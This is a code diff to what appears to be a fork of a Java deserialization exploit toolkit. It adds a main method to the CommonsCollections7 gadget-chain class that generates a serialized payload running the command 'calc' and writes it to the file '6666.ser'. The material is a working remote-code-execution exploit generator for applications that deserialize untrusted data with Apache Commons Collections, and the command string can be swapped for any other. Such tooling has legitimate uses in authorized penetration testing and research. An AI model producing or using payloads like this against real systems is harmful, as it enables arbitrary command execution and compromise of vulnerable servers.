@@ -9,6 +9,7 @@ import org.apache.commons.collections.Transformer;
 import org.apache.commons.collections.functors.ChainedTransformer;
 import org.apache.commons.collections.map.LazyMap;
 
+import java.io.FileOutputStream;
 import java.util.HashMap;
 import java.util.Hashtable;
 import java.util.Map;
@@ -46,5 +47,14 @@ public class CommonsCollections7 implements ObjectPayload<Hashtable> {
         lazyMap2.remove("yy");
 
         return hashtable;
+    }
+
+    public static void main(String[] args) throws Exception {
+        String           cmd    = "calc";
+        String[]         params = new String[]{cmd};
+        byte[]           bytes = (byte[]) CommonsCollectionsK4.class.getMethod("getObject", PayloadType.class, String[].class).invoke(CommonsCollectionsK4.class.newInstance(), PayloadType.nu1r, params);
+        FileOutputStream fous  = new FileOutputStream("6666.ser");
+        fous.write(bytes);
+        fous.close();
     }
 }
